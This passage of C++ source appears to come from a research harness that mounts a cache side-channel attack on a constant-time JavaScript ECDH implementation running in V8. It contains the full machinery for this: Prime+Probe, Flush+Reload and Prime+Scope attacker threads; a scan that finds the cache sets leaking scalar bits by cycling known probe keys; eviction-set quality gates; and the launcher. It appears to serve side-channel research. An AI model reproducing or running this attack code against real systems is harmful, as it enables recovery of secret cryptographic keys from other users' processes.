	return precise_evset_test_alt((u8 *)target, evset) == EV_POS;
}

/* One armed setup round on one candidate: the victim runs a derive while this
 * primes and probes. Returns the detection count and, when st is non-null,
 * the gap statistics of that trace. */
static int csi_profile_candidate(EVSet *evset,
                                 int threshold,
                                 const char *label,
                                 csi_stats *st) {
	memset(sample_tsc_arr, 0, sizeof(sample_tsc_arr));
	memset(reload_time_arr, 0, sizeof(reload_time_arr));
	pp_setup_arm();
	PP_profile_once(evset,
	                0,
	                label,
	                threshold,
	                profile_iterations,
	                pp_max_exec_cycles,
	                sample_tsc,
	                probe_time);

	int n = 0;
	for (int i = 0; i < profile_iterations; ++i) {
		if (sample_tsc_arr[0][i] != 0) {
			++n;
		}
	}
	if (st != nullptr) {
		csi_measure(sample_tsc_arr[0], n, st);
	}
	return n;
}

/* Hand the victim a known scalar and spend one unprofiled derive letting it
 * take effect (see pp_setup_key and v8_victim_run's setup pre-loop). */
static void csi_set_probe_key(const char *path) {
	pp_setup_key.store(path, std::memory_order_release);
	pp_setup_arm();
	sync_ctx_set_action(SYNC_CTX_START);
	pthread_barrier_wait(sync_ctx.barrier); /* A */
	pthread_barrier_wait(sync_ctx.barrier); /* B */
}

static bool csi_shape_ok(int samples, const csi_stats *st) {
	return samples >= csi_min_hits && samples <= csi_max_hits &&
	       st->gap_p15 >= csi_instep_gap_lo &&
	       st->gap_p15 <= csi_instep_gap_hi &&
	       st->gap_p90 >= csi_step_gap_lo &&
	       st->gap_spread >= evhealth_gap_spread_floor;
}

/* The 0-bit line: its count RISES with the number of 0-bits in the scalar,
 * by a margin large against its own scale, and lands in between for alt.
 * See csi_marker_contrast for why this is a difference and not a ratio. */
static bool csi_marker_matches(const int *hits) {
	int ones = hits[csi_key_ones], zeros = hits[csi_key_zeros],
	    alt = hits[csi_key_alt];
	if (zeros < csi_min_hits) {
		return false;
	}
	if ((double)(zeros - ones) < zeros * csi_marker_contrast) {
		return false;
	}
	double tol = zeros * csi_marker_mono_tol;
	return alt >= ones - tol && alt <= zeros + tol;
}

/* The per-select line: the same count whatever the scalar is, and ticking at
 * the ladder's own rate -- neither missing steps nor drowning in noise.
 *
 * `scale` is the marker's CONTRAST, zeros minus ones. That is the part of the
 * marker's count which tracks 0-bits, so it measures the ladder's per-step
 * activity while cancelling whatever key-independent floor the channel is
 * sitting on -- 419 and 466 on two sessions whose raw marker counts were 426
 * and 937. Using the raw all-zero count instead would inflate the yardstick
 * exactly when the floor is worst.
 *
 * Both bounds are load-bearing, and each was learned from a capture it would
 * have saved:
 *   too few  -- k7's l3_set=6519 ticked 313 against a 387 scale, merged bit
 *               slots, and decoded at 0.41 known-accuracy.
 *   too many -- a 1307-tick clock against a 466 scale passed when only the
 *               lower bound existed, and its capture decoded 0 traces. */
static bool csi_clock_matches(const int *hits, int scale) {
	int lo = hits[0], hi = hits[0];
	for (int k = 1; k < csi_probe_count; ++k) {
		lo = hits[k] < lo ? hits[k] : lo;
		hi = hits[k] > hi ? hits[k] : hi;
	}
	if (lo < csi_min_hits || (double)lo / hi < csi_flat_ratio) {
		return false;
	}
	double ticks = hits[csi_key_zeros];
	return ticks >= scale * csi_clock_scale_lo &&
	       ticks <= scale * csi_clock_scale_hi;
}

/* Tie-break among qualifying clock candidates.
 *
 * Key cycling QUALIFIES a clock candidate but cannot name it: the ladder is
 * constant-time, so every line it executes once per step is equally flat, and
 * a scan typically leaves half a dozen of them. They are all real per-step
 * tickers, so the choice is about trace quality, not identity -- and the
 * quality that matters to the decoder is a tight inter-step band, i.e. the
 * step period dominating the upper tail of the gap distribution rather than
 * an occasional missed step stretching it. p50/p90 measures exactly that: the
 * scan's clean per-step candidates sit at 0.82-0.94 and the smeared ones at
 * 0.12-0.26 (leapx02, 2026-08-17).
 *
 * NOT gap_spread, which this used to also multiply in: spread rewards a long
 * p90 tail, so it ranked the WORST candidate (p50/p90 0.12, spread 164) top. */
static double csi_clock_score(const csi_stats *st) {
	if (st->gap_p90 == 0) {
		return 0.0;
	}
	return (double)st->gap_p50 / st->gap_p90;
}

struct csi_candidate {
	int l3_set;
	EVSet *evset;
	int threshold;
	csi_stats st;
	int hits[csi_probe_count];
};

static int identify_ctjs_target_sets(PP_attacker_thread_config_t *cfgs) {
	config_t *cfg = get_config();
	int found = 0;

	log_info("CSI: scanning for target cache sets on core %d",
	         get_current_cpu());

	/* cache_env_init already ran in v8_ctjs_ecdh_attack -- calling it again
	 * here would just re-detect cache params for no reason. */
	helper_thread_ctrl hctrl;
	/* build_l2_evsets_all fails outright ("Cannot build L2 ev set for all
	 * uncertain sets") on roughly half the attempts on leapx02, with the box
	 * otherwise idle -- it is a probabilistic search, not a broken
	 * environment, and the very next attempt usually succeeds. Retrying here
	 * rather than making the operator re-run the whole capture. */
	int ev_ok = 0;
	for (int t = 0; t < csi_evset_build_retries; ++t) {
		if (!LLCF_multi_evset(0, &hctrl)) {
			ev_ok = 1;
			break;
		}
		log_warn("CSI: SF evset build failed (attempt %d/%d), retrying",
		         t + 1,
		         csi_evset_build_retries);
	}
	if (!ev_ok) {
		log_error("CSI: failed to build SF evsets after %d attempts",
		          csi_evset_build_retries);
		return 0;
	}
	if (start_helper_thread(&hctrl)) {
		log_error("CSI: failed to start helper thread");
		return 0;
	}

	const int clock_cl = find_clock_cl();
	const int marker_cl = clock_cl == 0 ? 1 : 0;
	uintptr_t target_loop = (uintptr_t)fr_lines[clock_cl].target;
	uintptr_t target_zero = (uintptr_t)fr_lines[marker_cl].target;

	uint32_t target_loop_page_slot =
	    (uint32_t)((target_loop & (PAGE_SIZE - 1)) >> CACHE_LINE_BITS);
	uint32_t target_zero_page_slot =
	    (uint32_t)((target_zero & (PAGE_SIZE - 1)) >> CACHE_LINE_BITS);
	static csi_candidate finalists[2][csi_max_finalists];
	int n_finalists[2] = { 0, 0 };
	/* Candidates at the right page slot that never got profiled at all --
	 * no evset, too few ways, or no usable threshold. A large count here
	 * means the scan only saw part of its search space. */
	int n_skipped[2] = { 0, 0 };
	/* Function scope so the failure diagnostic below can tell which of the
	 * two stage-2 tests came up empty. */
	int best_marker = -1;
	enum { ROLE_CLOCK = 0, ROLE_MARKER = 1 };
	static const char *role_name[2] = { "clock", "marker" };

	log_info("CSI: loop(clock,cl%d) slot %x, zero(marker,cl%d) slot %x",
	         clock_cl,
	         target_loop_page_slot,
	         marker_cl,
	         target_zero_page_slot);

	/* ---- stage 1: shape ---- */
	for (int l3_set = 0; l3_set < (int)cfg->l3.sets; ++l3_set) {
		uint32_t page_slot = (uint32_t)(l3_set % NUM_PAGE_SLOTS);
		bool at_loop_slot = target_loop_page_slot <= page_slot &&
		                    page_slot < target_loop_page_slot + 2;
		bool at_zero_slot = target_zero_page_slot <= page_slot &&
		                    page_slot < target_zero_page_slot + 2;
		if (!at_loop_slot && !at_zero_slot) {
			continue;
		}
		int role = at_loop_slot ? ROLE_CLOCK : ROLE_MARKER;
		if (n_finalists[role] >= csi_max_finalists) {
			/* Loud, because a full list means the rest of the slot goes
			 * unmeasured -- and the target could be in the part skipped. A
			 * sweep normally leaves under a dozen. */
			log_warn("CSI: %s finalist list full at %d, skipping the rest of "
			         "the page slot",
			         role_name[role],
			         csi_max_finalists);
			continue;
		}

		EVSet *evset = get_sf_kth_evset(l3_set);
		if (!evset || evset->size < SF_ASSOC) {
			++n_skipped[role];
			continue;
		}

		/* Under -csi-oracle, ask BEFORE any skip. A candidate dropped for a
		 * mechanical reason never reaches the log otherwise, so the true set
		 * disappearing looks exactly like the true set failing the
		 * fingerprint -- which sent this scan chasing the wrong bug once
		 * already. */
		bool is_true = false;
		if (csi_oracle_arg) {
			uintptr_t t = at_loop_slot ? target_loop : target_zero;
			is_true = csi_is_true_set(t, evset);
		}

		/* PP_profile_once, not PS_profile_once: the scan has to see what the
		 * capture will see, and the two probing methods are not
		 * interchangeable on the same evset (see pp_evset_quality_ok's own
		 * note for the measurement in the other direction). */
		int threshold = csi_calibrate_thres(evset, &hctrl);
		if (threshold == 0) {
			++n_skipped[role];
			if (is_true) {
				log_error("CSI: ORACLE: the true %s set (l3_set=%d, %u ways) "
				          "was SKIPPED -- no usable probe threshold",
				          role_name[role],
				          l3_set,
				          evset->size);
			}
			continue;
		}

		csi_stats st;
		int sample_cnt = csi_profile_candidate(
		    evset, threshold, role_name[role], &st);

		const char *verdict = is_true ? " ORACLE:TRUE" : "";
		if (csi_dump_arg && sample_cnt > 0) {
			char dir[256];
			snprintf(dir, sizeof(dir), "%s_csi_%s", test_name, role_name[role]);
			dump_profiling_trace(
			    dir, l3_set, sample_tsc, probe_time, 1, sample_cnt);
		}
		bool shape_ok = csi_shape_ok(sample_cnt, &st);
		if (csi_dump_arg || sample_cnt > csi_min_samples) {
			log_info("CSI: l3_set=%d(%s candidate) thres=%d samples=%d "
			         "span=%lu gap15=%lu gap50=%lu gap90=%lu spread=%.2f %s%s",
			         l3_set,
			         role_name[role],
			         threshold,
			         sample_cnt,
			         (unsigned long)st.span,
			         (unsigned long)st.gap_p15,
			         (unsigned long)st.gap_p50,
			         (unsigned long)st.gap_p90,
			         st.gap_spread,
			         shape_ok ? "SHAPE-OK" : "-",
			         verdict);
		}
		if (!shape_ok) {
			continue;
		}

		csi_candidate *c = &finalists[role][n_finalists[role]++];
		c->l3_set = l3_set;
		c->evset = evset;
		c->threshold = threshold;
		c->st = st;
		memset(c->hits, 0, sizeof(c->hits));
	}

	log_info("CSI: stage 1 kept %d clock (%d unprobed) and %d marker "
	         "(%d unprobed) candidate(s)",
	         n_finalists[ROLE_CLOCK],
	         n_skipped[ROLE_CLOCK],
	         n_finalists[ROLE_MARKER],
	         n_skipped[ROLE_MARKER]);

	/* ---- stage 2: key cycling ---- */
	if (n_finalists[ROLE_CLOCK] > 0 && n_finalists[ROLE_MARKER] > 0) {
		char key_path_abs[512];
		for (int k = 0; k < csi_probe_count; ++k) {
			snprintf(key_path_abs,
			         sizeof(key_path_abs),
			         "%s/%s",
			         cfg->project_root,
			         csi_probe_keys[k]);
			csi_set_probe_key(key_path_abs);
			for (int role = 0; role < 2; ++role) {
				for (int i = 0; i < n_finalists[role]; ++i) {
					csi_candidate *c = &finalists[role][i];
					c->hits[k] = csi_profile_candidate(
					    c->evset, c->threshold, role_name[role], nullptr);
				}
			}
		}
		/* Back to the scalar the capture is actually about, and pay its one
		 * unprofiled derive here rather than leaving a probe key loaded. */
		csi_set_probe_key(key_path);

		/* The marker goes first: it is the one key cycling names outright,
		 * and its all-zero count is the step count the clock is then judged
		 * against (see csi_clock_matches). */
		int best[2] = { -1, -1 };
		for (int i = 0; i < n_finalists[ROLE_MARKER]; ++i) {
			csi_candidate *c = &finalists[ROLE_MARKER][i];
			bool match = csi_marker_matches(c->hits);
			log_info("CSI: marker l3_set=%d hits ones=%d zeros=%d alt=%d %s",
			         c->l3_set,
			         c->hits[csi_key_ones],
			         c->hits[csi_key_zeros],
			         c->hits[csi_key_alt],
			         match ? "MATCH" : "-");
			if (!match) {
				continue;
			}
			/* Key cycling names exactly one line here; first match wins, and
			 * a second would mean the ratios are too loose for this build --
			 * worth seeing in the log. */
			if (best[ROLE_MARKER] < 0) {
				best[ROLE_MARKER] = i;
				best_marker = i;
			} else {
				log_warn("CSI: more than one marker candidate matches");
			}
		}

		/* The marker's key-dependent count, not its raw one -- see
		 * csi_clock_matches. */
		int scale = 0;
		if (best[ROLE_MARKER] >= 0) {
			const int *mh = finalists[ROLE_MARKER][best[ROLE_MARKER]].hits;
			scale = mh[csi_key_zeros] - mh[csi_key_ones];
		}
		double best_score = -1.0;
		for (int i = 0; i < n_finalists[ROLE_CLOCK] && scale > 0; ++i) {
			csi_candidate *c = &finalists[ROLE_CLOCK][i];
			bool match = csi_clock_matches(c->hits, scale);
			double score = csi_clock_score(&c->st);
			log_info("CSI: clock l3_set=%d hits ones=%d zeros=%d alt=%d "
			         "(scale %d) score %.3f %s",
			         c->l3_set,
			         c->hits[csi_key_ones],
			         c->hits[csi_key_zeros],
			         c->hits[csi_key_alt],
			         scale,
			         score,
			         match ? "MATCH" : "-");
			if (match && (best[ROLE_CLOCK] < 0 || score > best_score)) {
				best[ROLE_CLOCK] = i;
				best_score = score;
			}
		}

		if (best[ROLE_CLOCK] >= 0 && best[ROLE_MARKER] >= 0) {
			csi_candidate *cc = &finalists[ROLE_CLOCK][best[ROLE_CLOCK]];
			csi_candidate *mc = &finalists[ROLE_MARKER][best[ROLE_MARKER]];
			log_info(LOG_BOLD_ON "CSI: clock(cl%d) l3_set=%d thres=%d, "
			                     "marker(cl%d) l3_set=%d thres=%d" LOG_BOLD_OFF,
			         clock_cl,
			         cc->l3_set,
			         cc->threshold,
			         marker_cl,
			         mc->l3_set,
			         mc->threshold);
			cfgs[clock_cl].evset = cc->evset;
			cfgs[clock_cl].threshold = cc->threshold;
			cfgs[marker_cl].evset = mc->evset;
			cfgs[marker_cl].threshold = mc->threshold;
			found = 1;
		}
	}

	stop_helper_thread(&hctrl);
	/* Releases the victim's setup pre-loop -- unconditionally, success or
	 * not, so it is never left waiting on a barrier the caller has given up
	 * driving (see v8_ctjs_ecdh_attack, which exit(1)s on failure). */
	pp_setup_done();

	/* Say WHICH stage came up empty. "could not identify" alone does not
	 * distinguish "no candidate carried the signal" (stage 1 -- re-running
	 * will not help, the bounds or the leak site are wrong; re-measure with
	 * -csi-dump) from "candidates were there but none had the key-dependent
	 * signature" (stage 2 -- the marker line has moved, or the probe scalars
	 * are not driving the branch they should). */
	if (!found) {
		if (n_finalists[ROLE_CLOCK] == 0 || n_finalists[ROLE_MARKER] == 0) {
			log_error("CSI: stage 1 found no %s candidate at all -- re-measure "
			          "the accept bounds with -csi-dump (csi_shape_ok)",
			          n_finalists[ROLE_CLOCK] == 0 ? "clock" : "marker");
		} else {
			log_error("CSI: stage 2 matched no %s among %d clock / %d marker "
			          "candidate(s) -- the key-dependent line may have moved, "
			          "check the hits ones/zeros/alt lines above",
			          best_marker < 0 ? "marker" : "clock",
			          n_finalists[ROLE_CLOCK],
			          n_finalists[ROLE_MARKER]);
		}
	}
	return found;
}

/* Setup-phase quality gate for a prepare_evset_thres-built evset (no CSI
 * scan involved) -- same gap-spread check identify_ctjs_target_sets uses
 * to accept a scanned candidate, just for the ONE evset prepare_evset_thres
 * already committed to. Mandatory for -pp (psd_check_arg), replacing the
 * old round-loop -psd-check for PP -- P+S keeps that one, see
 * v8_attacker_thread. Caller must call pp_setup_done() once after the
 * whole quality-check pass, whether -csi ran first or not.
 *
 * PP_profile_once, NOT PS_profile_once: measured 2026-08-12 on leapx02,
 * PS_profile_once (single-line _time_maccess_aux against the fixed
 * detected_cache_lats.l2_thresh) against a prepare_evset_thres evset gave
 * the marker channel exactly 1 sample every time (3/3 runs) -- prepare_
 * evset_thres calibrates its evset AND threshold for probe_skx_sf_evset_
 * para's traversal probing (what the real v8_attacker_thread_pp capture
 * loop uses via PP_profile_once), not single-line P+S timing; the two
 * probing methods are not interchangeable on the same evset. */
static bool pp_evset_quality_ok(int cl, EVSet *evset, int threshold, const char *label) {
	memset(sample_tsc_arr, 0, sizeof(sample_tsc_arr));
	memset(reload_time_arr, 0, sizeof(reload_time_arr));
	pp_setup_arm();
	PP_profile_once(evset,
	                0,
	                label,
	                threshold,
	                profile_iterations,
	                pp_max_exec_cycles,
	                sample_tsc,
	                probe_time);

	int sample_cnt = 0;
	for (int i = 0; i < profile_iterations; ++i) {
		if (sample_tsc_arr[0][i] != 0) {
			++sample_cnt;
		}
	}
	bool is_clock = target_lines[cl].role == 'c';
	bool ok = is_clock ? check_loop_distribution(sample_tsc_arr[0], sample_cnt) :
	                     check_zero_distribution(sample_tsc_arr[0], sample_cnt);
	log_info("psd-check cl%d: %d samples, shape %s",
	         cl,
	         sample_cnt,
	         ok ? "OK" : "FAIL -- evset looks bad");
	return ok;
}

int v8_ctjs_ecdh_attack() {
	/* sync_ctx is already set up: main resets it once, before the victim
	 * thread exists. Doing it here would race the victim's first
	 * pthread_barrier_wait, and reset_sync_ctx is free+init on the one global
	 * -- the loser can be left holding a barrier whose shm was just released. */
	if (cache_env_init(1)) {
		log_error("failed to initialize cache env");
		return 1;
	}

	for (int cl = 0; cl < cache_line_count; ++cl) {
		sample_tsc[cl] = sample_tsc_arr[cl];
		probe_time[cl] = reload_time_arr[cl];
	}

	init_target_lines();
	write_channel_metadata();

	const int attacker_count = prim == PRIM_FR ? 1 : cache_line_count;
	pthread_t attackers[cache_line_count];

	int started = 0;
	if (prim != PRIM_FR && pthread_barrier_init(&attacker_threads_barrier,
	                                            nullptr,
	                                            attacker_count) != 0) {
		log_error("failed to init attacker thread barrier");
		return 1;
	}

	if (prim == PRIM_PP) {
		for (int cl = 0; cl < cache_line_count; ++cl) {
			pp_cfg[cl].label = fr_lines[cl].label;
			pp_cfg[cl].slot = cl;
			pp_cfg[cl].target = (uintptr_t)fr_lines[cl].target;
			PP_thread_config_init(pp_cfg[cl]);
		}

		if (csi_arg) {
			/* Fills evset AND threshold for both channels: the scan probes
			 * every candidate with the capture's own primitive, so the
			 * threshold it calibrated (csi_calibrate_thres) is the one the
			 * capture must use. */
			if (!identify_ctjs_target_sets(pp_cfg)) {
				log_error("CSI: could not identify target cache sets");
				exit(1);
			}
		} else {
			for (int cl = 0; cl < cache_line_count; ++cl) {
				prepare_evset_thres(
				    pp_cfg[cl].target, &pp_cfg[cl].evset, &pp_cfg[cl].threshold);
			}
		}

		for (int cl = 0; cl < cache_line_count; ++cl) {
			if (pp_cfg[cl].evset == nullptr || pp_cfg[cl].threshold == 0) {
				log_error("cannot build evset for cl%d (%s +0x%03lx)",
				          cl,
				          fr_lines[cl].label,
				          target_lines[cl].off);
				exit(1);
			}
		}

		/* Mandatory hit-count/gap-shape quality gate for -pp (see EVSET
		 * HEALTH): -csi's own scan already vetted its evsets by the same
		 * shape check, so this only re-checks the prepare_evset_thres path.
		 * Setup phase, not the attack threads. */
		if (psd_check_arg && !csi_arg) {
			bool quality_ok = true;
			for (int cl = 0; cl < cache_line_count; ++cl) {
				quality_ok = pp_evset_quality_ok(cl,
				                                 pp_cfg[cl].evset,
				                                 pp_cfg[cl].threshold,
				                                 pp_cfg[cl].label) &&
				             quality_ok;
			}
			pp_setup_done();
			if (!quality_ok) {
				log_error("psd-check: evset quality gate failed, aborting");
				exit(1);
			}
		}
	}

	bool launch_ok = true;
	for (int cl = 0; cl < attacker_count; ++cl) {
		ps_thread_cl[cl] = cl;
		void *cl_arg = prim == PRIM_PP ? (void *)&pp_cfg[cl] :
		                                 (void *)&ps_thread_cl[cl];
		if (pthread_create(&attackers[cl],
		                   nullptr,
		                   prim == PRIM_FR ? v8_attacker_thread_fr :
		                   prim == PRIM_PP ? v8_attacker_thread_pp :
		                                     v8_attacker_thread,
		                   cl_arg) != 0) {
			log_error("failed to start attacker thread cl%d", cl);
			launch_ok = false;
			break;
		}
		++started;
	}

	for (int cl = 0; cl < started; ++cl) {
		if (!launch_ok) {
			pthread_cancel(attackers[cl]);
		}
		pthread_join(attackers[cl], nullptr);
	}

	if (prim != PRIM_FR) {
		pthread_barrier_destroy(&attacker_threads_barrier);
	}
	return launch_ok ? 0 : 1;
}

int main(int argc, char *argv[]) {
	bool argv_ok = true;
	{
		int new_argc = 0;
		for (int i = 0; i < argc; ++i) {
			if (strcmp(argv[i], "-fr") == 0) {
				prim = PRIM_FR;
			} else if (strcmp(argv[i], "-pp") == 0) {
				prim = PRIM_PP;
			} else if (strcmp(argv[i], "-debug") == 0) {
				/* Rejected rather than ignored: silently dropping it would
				 * leave it to land in a path slot, and accepting it would put
				 * the oracle back under two switches that can disagree. */
				log_error("-debug is gone -- the victim's ground truth now "
				          "follows `let debug = 1;` in <source.js>, which "
				          "evaluation/run_ecdh_ct.sh generates for you with "
				          "BITS=1.");
				argv_ok = false;
			} else if (strcmp(argv[i], "-ps-full") == 0) {
				ps_fast_reprime = false;
				ps_arr_repeat = array_repeat;
				ps_l2_repeat = l2_repeat;
			} else if (strcmp(argv[i], "-ps-chain") == 0) {
				ps_fast_reprime = true;
			} else if (strncmp(argv[i], "-ps-repeat=", 11) == 0) {
				ps_arr_repeat = (uint32_t)strtoul(argv[i] + 11, nullptr, 0);
			} else if (strncmp(argv[i], "-cl", 3) == 0 &&
			           isdigit((unsigned char)argv[i][3]) &&
			           argv[i][4] == '=') {
				if (!parse_target_line(argv[i][3] - '0', argv[i] + 5)) {
					argv_ok = false;
				}
			} else if (strncmp(argv[i], "-wait=", 6) == 0) {
				fr_wait_cycles = strtoull(argv[i] + 6, nullptr, 0);
			} else if (strncmp(argv[i], "-thresh=", 8) == 0) {
				fr_hit_thresh = (i64)strtoll(argv[i] + 8, nullptr, 0);
			} else if (strncmp(argv[i], "-csi-runs=", 10) == 0) {
				const char *v = argv[i] + 10;
				csi_runs = (int)strtol(v, nullptr, 0);
				if (csi_runs <= 0 || csi_runs > csi_runs_max) {
					log_error("-csi-runs=%s: must be 1..%d", v, csi_runs_max);
					argv_ok = false;
				}
			} else if (strcmp(argv[i], "-csi") == 0) {
				csi_arg = true;
			} else if (strcmp(argv[i], "-csi-dump") == 0) {
				csi_arg = true;
				csi_dump_arg = true;
			} else if (strcmp(argv[i], "-csi-oracle") == 0) {
				csi_arg = true;
				csi_oracle_arg = true;
			} else if (strcmp(argv[i], "-psd-check") == 0) {
				psd_check_arg = true;
			} else if (strncmp(argv[i], "-runs=", 6) == 0) {
				victim_runs = atoi(argv[i] + 6);
			} else if (strncmp(argv[i], "-warmup=", 8) == 0) {
				warmup_runs = atoi(argv[i] + 8);
			} else {
				argv[new_argc++] = argv[i];
			}
		}
		argc = new_argc;
	}
	/* -pp always pays for the evset-health probe segment and aborts on a bad
	 * verdict -- a bad P+P evset smears silently otherwise (see EVSET HEALTH
	 * above). Unconditional, no opt-out; -psd-check itself stays the -ps
	 * opt-in. */
	if (prim == PRIM_PP) {
		psd_check_arg = true;
	}
	/* -fr has no eviction set for either to evaluate -- see
	 * v8_attacker_thread_fr and the EVSET HEALTH comment. -csi is PP-only:
	 * identify_ctjs_target_sets picks P+P's evset in setup, before any
	 * attacker thread exists; P+S still builds its own per-thread (see
	 * v8_attacker_thread), which -csi has no hook into. */
	if (prim == PRIM_FR && (csi_arg || psd_check_arg)) {
		log_error("-csi/-psd-check are not supported with -fr (flush+reload "
		          "has no eviction set for either to evaluate)");
		argv_ok = false;
	}
	if (prim == PRIM_PS && csi_arg) {
		log_error(
		    "-csi is only supported with -pp (identify_ctjs_target_sets "
		    "picks P+P's evset in setup; P+S builds its own per-thread)");
		argv_ok = false;
	}
	if (!argv_ok) {
		return 1;
	}
	if (argc < 4) {
		print_helper(argc, argv);
		return 1;
	}
	source_str = read_file(argv[1]);
	repeat_str = read_file(argv[2]);
	key_path = argv[3];
	/* Name the file, and say so when it looks like a mistyped flag: anything
	 * the option loop above did not recognise is kept and lands in a path slot,
	 * so a mistyped attacker flag or a V8 flag placed before the paths fails
	 * here rather than where the mistake was. */
	for (int i = 1; i <= 2; ++i) {
		const char *s = i == 1 ? source_str : repeat_str;
		if (s) {
			continue;
		}
		log_error("could not read %s file '%s'%s",
		          i == 1 ? "source" : "repeat",
		          argv[i],
		          argv[i][0] == '-' ?
		              " -- that looks like a flag, not a path. Attacker flags "
		              "take ONE dash (-pp, -fr, -runs=) and go before the "
		              "paths; V8 flags go AFTER all three paths." :
		              "");
	}
	if (!source_str || !repeat_str) {
		return 1;
	}

	reset_sync_ctx(V8_PROJ_ID);

	pthread_t victim_pthread = 0;

	v8::V8::InitializeICUDefaultLocation(argv[0]);
	v8::V8::SetFlagsFromCommandLine(&argc, argv, true);

	if (pthread_create(&victim_pthread, nullptr, v8_victim_thread, nullptr) !=
	    0) {
		log_error("failed to start the victim thread");
		return 1;
	}
	int rc = v8_ctjs_ecdh_attack();

	pthread_join(victim_pthread, nullptr);

	return rc;
}
